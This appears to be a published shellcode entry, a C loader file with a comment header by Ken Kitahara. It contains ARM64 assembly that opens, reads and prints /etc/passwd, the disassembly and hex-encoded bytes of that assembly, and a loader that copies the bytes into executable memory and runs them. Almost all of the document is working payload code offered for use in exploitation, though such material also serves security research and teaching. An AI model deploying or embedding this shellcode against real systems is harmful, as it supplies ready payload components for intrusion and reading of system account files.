/*
# Title:  Linux/ARM64 - Read /etc/passwd Shellcode (120 Bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat passwd.s
.section .text
.global _start
_start:
    // fd = openat(0, "/etc/passwd", O_RDONLY)
    mov  x0, xzr
    mov  x1, #0x7773
    movk x1, #0x64, lsl #16
    str  x1, [sp, #-8]!
    mov  x1, #0x652f
    movk x1, #0x6374, lsl #16
    movk x1, #0x702f, lsl #32
    movk x1, #0x7361, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x0
    mov  x2, xzr
    mov  x8, #56
    svc  #0x1337

    mvn  x3, x0

    // read(fd, *buf, size)
    mov  x2, #0xfff
    sub  sp, sp, x2
    mov  x8, xzr
    add  x1, sp, x8
    mov  x8, #63
    svc  #0x1337

    // write(1, *buf, size)
    str  x0, [sp, #-8]!
    lsr  x0, x2, #11
    ldr  x2, [sp], #8
    mov  x8, #64
    svc  #0x1337

    // status = close(fd)
    mvn  x0, x3
    mov  x8, #57
    svc  #0x1337

    // exit(status)
    mov  x8, #93
    svc  #0x1337
ubuntu@ubuntu:~/works$ as -o passwd.o passwd.s && ld -o passwd passwd.o
ubuntu@ubuntu:~/works$ objdump -d ./passwd

./passwd:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	aa1f03e0 	mov	x0, xzr
  40007c:	d28eee61 	mov	x1, #0x7773                	// #30579
  400080:	f2a00c81 	movk	x1, #0x64, lsl #16
  400084:	f81f8fe1 	str	x1, [sp,#-8]!
  400088:	d28ca5e1 	mov	x1, #0x652f                	// #25903
  40008c:	f2ac6e81 	movk	x1, #0x6374, lsl #16
  400090:	f2ce05e1 	movk	x1, #0x702f, lsl #32
  400094:	f2ee6c21 	movk	x1, #0x7361, lsl #48
  400098:	f81f8fe1 	str	x1, [sp,#-8]!
  40009c:	8b2063e1 	add	x1, sp, x0
  4000a0:	aa1f03e2 	mov	x2, xzr
  4000a4:	d2800708 	mov	x8, #0x38                  	// #56
  4000a8:	d40266e1 	svc	#0x1337
  4000ac:	aa2003e3 	mvn	x3, x0
  4000b0:	d281ffe2 	mov	x2, #0xfff                 	// #4095
  4000b4:	cb2263ff 	sub	sp, sp, x2
  4000b8:	aa1f03e8 	mov	x8, xzr
  4000bc:	8b2863e1 	add	x1, sp, x8
  4000c0:	d28007e8 	mov	x8, #0x3f                  	// #63
  4000c4:	d40266e1 	svc	#0x1337
  4000c8:	f81f8fe0 	str	x0, [sp,#-8]!
  4000cc:	d34bfc40 	lsr	x0, x2, #11
  4000d0:	f84087e2 	ldr	x2, [sp],#8
  4000d4:	d2800808 	mov	x8, #0x40                  	// #64
  4000d8:	d40266e1 	svc	#0x1337
  4000dc:	aa2303e0 	mvn	x0, x3
  4000e0:	d2800728 	mov	x8, #0x39                  	// #57
  4000e4:	d40266e1 	svc	#0x1337
  4000e8:	d2800ba8 	mov	x8, #0x5d                  	// #93
  4000ec:	d40266e1 	svc	#0x1337
ubuntu@ubuntu:~/works$ objcopy -O binary passwd passwd.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' passwd.bin && echo
\xe0\x03\x1f\xaa\x61\xee\x8e\xd2\x81\x0c\xa0\xf2\xe1\x8f\x1f\xf8\xe1\xa5\x8c\xd2\x81\x6e\xac\xf2\xe1\x05\xce\xf2\x21\x6c\xee\xf2\xe1\x8f\x1f\xf8\xe1\x63\x20\x8b\xe2\x03\x1f\xaa\x08\x07\x80\xd2\xe1\x66\x02\xd4\xe3\x03\x20\xaa\xe2\xff\x81\xd2\xff\x63\x22\xcb\xe8\x03\x1f\xaa\xe1\x63\x28\x8b\xe8\x07\x80\xd2\xe1\x66\x02\xd4\xe0\x8f\x1f\xf8\x40\xfc\x4b\xd3\xe2\x87\x40\xf8\x08\x08\x80\xd2\xe1\x66\x02\xd4\xe0\x03\x23\xaa\x28\x07\x80\xd2\xe1\x66\x02\xd4\xa8\x0b\x80\xd2\xe1\x66\x02\xd4

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\xe0\x03\x1f\xaa\x61\xee\x8e\xd2\x81\x0c\xa0\xf2\xe1\x8f\x1f\xf8"
"\xe1\xa5\x8c\xd2\x81\x6e\xac\xf2\xe1\x05\xce\xf2\x21\x6c\xee\xf2"
"\xe1\x8f\x1f\xf8\xe1\x63\x20\x8b\xe2\x03\x1f\xaa\x08\x07\x80\xd2"
"\xe1\x66\x02\xd4\xe3\x03\x20\xaa\xe2\xff\x81\xd2\xff\x63\x22\xcb"
"\xe8\x03\x1f\xaa\xe1\x63\x28\x8b\xe8\x07\x80\xd2\xe1\x66\x02\xd4"
"\xe0\x8f\x1f\xf8\x40\xfc\x4b\xd3\xe2\x87\x40\xf8\x08\x08\x80\xd2"
"\xe1\x66\x02\xd4\xe0\x03\x23\xaa\x28\x07\x80\xd2\xe1\x66\x02\xd4"
"\xa8\x0b\x80\xd2\xe1\x66\x02\xd4";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}